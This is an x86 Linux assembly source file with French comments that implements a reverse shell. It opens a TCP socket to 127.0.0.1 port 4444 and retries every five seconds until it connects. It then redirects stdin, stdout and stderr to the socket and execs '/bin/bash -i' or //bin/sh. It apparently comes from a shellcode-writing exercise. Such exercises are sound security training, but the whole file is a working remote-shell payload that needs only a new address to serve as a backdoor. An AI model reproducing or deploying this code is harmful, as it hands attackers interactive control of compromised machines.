section .data
		delay dq 5, 500000000															;Delais en seconde puis en nanoseconde
		tent_connect db "Tentative de connexion", 0xa			;Massage de tentative e Connexion
		len_tent_connect equ $-tent_connect								;Longueur du message
		connected db "Connecte", 0xa
		len_connected equ $-connected
		fancyterminal	db "/bin/bash -i", 0xa							;Commande pour obtenir le fancy terminal

section .text
global _start

_start:
    ;Creation Socket
    mov     eax, 0x66           ;appel system socketcall
    mov     ebx, 0x1            ;appel system sys_socket
    push    0x0                 ;type 0 = appel protocole IP
    push    0x1                 ;type 1 = sock_stream
    push    0x2                 ;type 2 = AF_INET = iPv4
    mov     ecx, esp            ;on donne a ecx la valeur des arguments
    int     80h                 ;interruption system
    jmp 		connect

;Connexion Socket
connect:
    mov     edx, eax            ;sauvegarde de la valeur de eax dans edx
    mov     eax, 0x66           ;appel system socketcall
    mov     ebx, 0x3            ;argument 3 syscall = appel system sys_connect

    ;Parametre de connexion
    push    0x0100007f          ;adresse IP 127.0.0.1
    push    word 0x5c11         ;port ecoute 4444
    push    word 0x2            ;AF_INET (IPv4)
    mov     esi, esp            ;sauvegarde des arguments dans ecx

    push    0x10                ;
    push    esi                	;on push les arguments de connexion
    push    edx                 ;on push les arguments de socket
    mov     ecx, esp            ;sauvegarde des arguments dans ecx
    jmp 		connect_syscall

connect_syscall:
		;Sauvegarde des registres utiles
		push 		ebx
		push 		ecx
		push 		edx

		mov			eax, 4									;appel system write
		mov 		ebx, 1
		mov 		ecx, tent_connect
		mov 		edx, len_tent_connect
		int			80h

		;Recuperation des registres utiles
		pop 		edx
		pop 		ecx
		pop 		ebx

		mov 		eax, 0x66           ;appel system socketcall
    int 		80h                 ;interruption system
    jmp 		check

;Comparaison valeur eax pour savoir si la connexion a ete effectue, si non alors on retente la connexion
check:
    cmp     eax, 0              			;comparaison eax a 0 pour verifier la connexion
    je      duplicate_filedescriptor    	;si eax equal 0, alors la connexion a ete effectue

    ;sauvegarde du registre ebx dont la valeur nous interesse
    push 		ebx

		;sleep 5 secondes
    mov 		eax, 0xa2		;nanosleep
    mov 		ebx, delay	;delai predefini dans la section data
		int 		80h

		;recuperation de ebx
    pop 		ebx

    jmp     connect_syscall            		;si eax different de 0, alors la connexion n'a pas ete etabli et l'on retente la connexion

;Duplication stdin, stdout et stderr
duplicate_filedescriptor:

		;sauvegarde du registre edx dont la valeur nous interesse
		push 		edx

		mov			eax, 4							;appel system write
		mov 		ebx, 1
		mov 		ecx, connected
		mov 		edx, len_connected
		int			80h

		;recuperation de edx
		pop 		edx

    mov     eax, 0x3f           ;appel system 63 = dup2
    mov     ebx, edx            ;sauvegarde de edx dans ebx
    xor     ecx, ecx            ;on clear ecx avec un xor
    int     80h                 ;interruption system

    mov     eax, 0x3f           ;appel system 63 = dup2
    inc     ecx            			;inc -> +1 0x1 = stdout
    int     80h                 ;interruption system

    mov     eax, 0x3f           ;appel system 63 = dup2
    inc     ecx	          			;inc -> +1 0x2 = stderr
    int     80h                 ;interruption system
    jmp 		shell

;Lancement du shell
shell:

		mov			eax, 4							;appel system write
		mov 		ebx, 1
		mov 		ecx, connected
		mov 		edx, len_connected
		int			80h

		mov     eax, 0xb	          ;0xb -> 11, sys_execve
		mov			ebx, fancyterminal
		int 		80h

		mov     eax, 0xb	          ;0xb -> 11, sys_execve

		;et la on va inserer //bin/sh dans la stack (en sens inverse toujours) pour appeller le shell dans le process actuel

		xor     ebx, ebx	        	;on clear ebx
		push    ebx	                ;Null pour terminer la commande
		push    0x68732f6e	        ;hs/n, donc n/sh a l'envers
		push    0x69622f2f	        ;ib//, donc //bi a l'envers
		mov     ebx, esp	        	;on adresse a ebx l'adresse du premier bloc de notre commande qui est situe dans la stack

		xor     ecx, ecx            ;
		xor     edx, edx	        	;on xorifie pour clear
		int     80h                 ;interruption system
